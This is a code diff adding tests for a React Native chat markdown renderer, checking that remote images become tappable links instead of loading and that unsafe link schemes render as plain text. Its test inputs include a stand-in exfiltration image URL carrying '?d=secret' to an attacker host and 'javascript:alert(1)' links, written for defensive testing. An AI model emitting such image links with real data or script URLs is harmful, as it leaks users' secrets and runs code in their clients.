@@ -53,9 +53,9 @@ vi.mock("react-native", async () => {
 
   return {
     View: mockComponent("rn-view", ["minWidth"]),
-    Text: mockComponent("rn-text", ["accessibilityRole"]),
+    Text: mockComponent("rn-text", ["accessibilityRole", "textDecorationLine"]),
     ScrollView: mockComponent("rn-scroll-view", ["horizontal"]),
-    Pressable: mockComponent("rn-pressable", ["accessibilityRole"]),
+    Pressable: mockComponent("rn-pressable", ["accessibilityRole", "borderBottomWidth"]),
     TextInput: mockComponent("rn-text-input"),
     Image: mockComponent("rn-image"),
     Animated: {
@@ -120,6 +120,7 @@ describe("native markdown tables", () => {
     expect(html).toContain("Alice");
     expect(html).toContain("A longer note that wraps inside the cell");
     expect(html).toContain('data-accessibility-role="link"');
+    expect(html).toContain('data-text-decoration-line="underline"');
     expect(html).toContain("docs");
   });
 
@@ -173,5 +174,149 @@ describe("user message links", () => {
       root.unmount();
     });
     container.remove();
+  });
+});
+
+describe("native markdown images", () => {
+  it("shows a remote image as a tappable link instead of loading it", async () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {'![chart](https://attacker.example.test/p.gif?d=secret "Q3 revenue")'}
+      </ChatMarkdown>,
+    );
+    expect(html).not.toContain("<rn-stub");
+    expect(html).toContain('accessibilityHint="Q3 revenue"');
+    expect(html).toContain('data-accessibility-role="link"');
+    expect(html).toContain(">chart</rn-text>");
+
+    vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
+    linking.openURL.mockClear();
+    const container = document.createElement("div");
+    document.body.appendChild(container);
+    const root = createRoot(container);
+    await act(async () => {
+      root.render(
+        <ChatMarkdown>{"![chart](https://attacker.example.test/p.gif?d=secret)"}</ChatMarkdown>,
+      );
+    });
+    await act(async () => {
+      container.querySelector<HTMLElement>("[data-accessibility-role='link']")?.click();
+    });
+    await vi.waitFor(() => {
+      expect(linking.openURL).toHaveBeenCalledWith("https://attacker.example.test/p.gif?d=secret");
+    });
+    await act(async () => {
+      root.unmount();
+    });
+    container.remove();
+  });
+
+  it("shows unopenable image sources and unsafe links as plain text", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"![logo](/api/v1/p.gif) ![](example.test/p.gif) [x](javascript:alert(1))"}
+      </ChatMarkdown>,
+    );
+    expect(html).not.toContain("<rn-stub");
+    expect(html).not.toContain("data-accessibility-role");
+    expect(html).not.toContain("data-text-decoration-line");
+    expect(html).not.toContain("javascript:");
+    expect(html).toContain(">x</rn-text>");
+    expect(html).toContain("logo");
+    expect(html).toContain("example.test/p.gif");
+  });
+
+  it("keeps an image inside a link as that link's text", async () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"[![build](https://badge.example.test/b.svg)](https://ci.example.test/run)"}
+      </ChatMarkdown>,
+    );
+    expect(html).not.toContain("<rn-stub");
+    expect(html.match(/data-accessibility-role="link"/g)).toHaveLength(1);
+    expect(html).toContain('data-text-decoration-line="underline"');
+    expect(html).toContain("build");
+
+    const inline = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"See [![build](https://badge.example.test/b.svg)](https://ci.example.test/run) now"}
+      </ChatMarkdown>,
+    );
+    expect(inline).not.toContain("<rn-stub");
+    expect(inline.match(/data-accessibility-role="link"/g)).toHaveLength(1);
+    expect(inline).toContain("build");
+
+    vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
+    linking.openURL.mockClear();
+    const container = document.createElement("div");
+    document.body.appendChild(container);
+    const root = createRoot(container);
+    await act(async () => {
+      root.render(
+        <ChatMarkdown>
+          {"[![build](https://badge.example.test/b.svg)](https://ci.example.test/run)"}
+        </ChatMarkdown>,
+      );
+    });
+    await act(async () => {
+      container.querySelector<HTMLElement>("[data-accessibility-role='link']")?.click();
+    });
+    await vi.waitFor(() => {
+      expect(linking.openURL).toHaveBeenCalledWith("https://ci.example.test/run");
+    });
+    await act(async () => {
+      root.unmount();
+    });
+    container.remove();
+  });
+
+  it("shows an image inside a rejected link as plain text", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {
+          "[![Open](https://example.test/visit)](javascript:alert(1)) [![File](https://example.test/file)](data:text/html,hi)"
+        }
+      </ChatMarkdown>,
+    );
+    expect(html).not.toContain("<rn-stub");
+    expect(html).not.toContain("<rn-pressable");
+    expect(html).not.toContain("data-accessibility-role");
+    expect(html).not.toContain("data-text-decoration-line");
+    expect(html).not.toContain("example.test");
+    expect(html).not.toContain("javascript:");
+    expect(html).toContain("Open");
+    expect(html).toContain("File");
+  });
+
+  it("shows mailto and tel image sources as plain text", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>{"![Contact](mailto:user@example.test) ![Call](tel:+15551212)"}</ChatMarkdown>,
+    );
+    expect(html).not.toContain("data-accessibility-role");
+    expect(html).not.toContain("data-text-decoration-line");
+    expect(html).not.toContain("mailto:");
+    expect(html).not.toContain("tel:");
+    expect(html).toContain("Contact");
+    expect(html).toContain("Call");
+  });
+
+  it("shows an image-only link with an unopenable destination as plain text", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>{"[![build](https://badge.example.test/b.svg)](/run)"}</ChatMarkdown>,
+    );
+    expect(html).not.toContain("<rn-pressable");
+    expect(html).not.toContain("data-accessibility-role");
+    expect(html).not.toContain("data-text-decoration-line");
+    expect(html).not.toContain("badge.example.test");
+    expect(html).toContain("build");
+  });
+
+  it("renders embedded image data inline", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>{"![dot](data:image/png;base64,iVBORw0KGgo=)"}</ChatMarkdown>,
+    );
+    // The image component is a stub under test; a link would mean it fell back.
+    expect(html).toContain("<rn-stub");
+    expect(html).not.toContain("data-accessibility-role");
   });
 });
